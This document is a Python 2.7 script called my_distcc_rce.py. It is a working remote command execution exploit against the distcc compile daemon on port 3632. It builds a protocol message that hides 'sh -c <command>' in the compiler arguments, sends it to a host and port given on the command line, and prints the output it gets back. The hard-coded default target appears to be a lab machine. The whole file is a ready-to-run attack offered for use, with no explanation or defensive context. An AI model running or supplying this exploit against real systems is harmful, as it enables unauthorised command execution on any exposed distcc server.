#!/usr/bin/python2.7

# -*- coding: utf-8 -*-

import socket
import string
import random
import sys

HOST = "10.129.171.70"
PORT = 3632
COMMAND = "id"

def alphanumeric(length):
    return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(0, length)])

def prepare_payload(command):
    # prepares a distcc protocol request message
    # -- https://github.com/distcc/distcc/blob/master/doc/protocol-1.txt

    args = ["sh", "-c", command, "#", "-c", "main.c"]

    # -- protocol version
    payload = "DIST" + "00000001"
    # -- number of args
    payload += "ARGC" + "%.8x" % len(args) 

    # -- arguments
    for arg in args:                       
        payload += ("ARGV" + "%.8x" + "%s") % (len(arg), arg)

    # -- pre-processed source contents
    payload += "DOTI" + "0000000A" + alphanumeric(10)

    return payload

def exploit(host, port, command):
    payload = prepare_payload(command)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(5)
    s.settimeout(5)

    if s.connect_ex((host, port)) == 0:
        print("[OK] - Connected to remove service")
        s.send(payload)

        # contains:
        # DONE00000001STAT00000000 = DONE <version> + STAT <status>
        s.recv(24)

        # -- read stderr
        s.recv(4) # SERR
        stderr_len = int(s.recv(8), 16) # <len>
        stderr = s.recv(stderr_len)

        # -- read stdout
        s.recv(4) # STDOUT
        stdout_len = int(s.recv(8), 16) # <len>
        stdout = s.recv(stdout_len)

        print()
 
        if stderr_len:
            print("\tSTDERR:\n")
            print("====================")
            print(stderr)

        if stdout_len:
            print("\tSTDOUT:\n")
            print("====================")        
            print(stdout)
            
    else:
        print("[ERROR] - Failed to connect to %s on port %d" % (host, port))

            
if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("[HELP] - Usage: my_distcc_rce.py <host> <port> <command>")
        exit()
    else:
        host = sys.argv[1]
        port = int(sys.argv[2])
        command = sys.argv[3]
        exploit(host, port, command)
